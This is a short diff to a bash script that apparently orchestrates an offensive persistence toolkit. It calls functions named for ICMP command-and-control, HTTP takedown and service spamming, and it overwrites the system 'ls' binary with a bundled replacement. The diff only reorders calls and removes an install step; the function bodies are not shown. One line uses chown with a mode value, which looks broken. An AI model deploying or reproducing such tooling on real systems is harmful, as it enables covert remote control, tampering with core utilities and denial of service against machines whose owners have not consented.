@@ -40,17 +40,18 @@ serviceSpam () {
 
 if [[ "$WHICH" == "all" ]]; then
     # Currently debugging installer script
-    install
     icmpC2
     ping_install
     processd
     httpTakedown
-    serviceSpam
+    
     if [[ $IS_UB_LOCKDOWN == "true" ]]; then
         cd "$ROOT_PATH/coreutils"
         chown 755 ls
         mv ls $(which ls)
     fi
+    
+    serviceSpam
 fi
 if [[ "$WHICH" == "icmp" ]]; then
     icmpC2
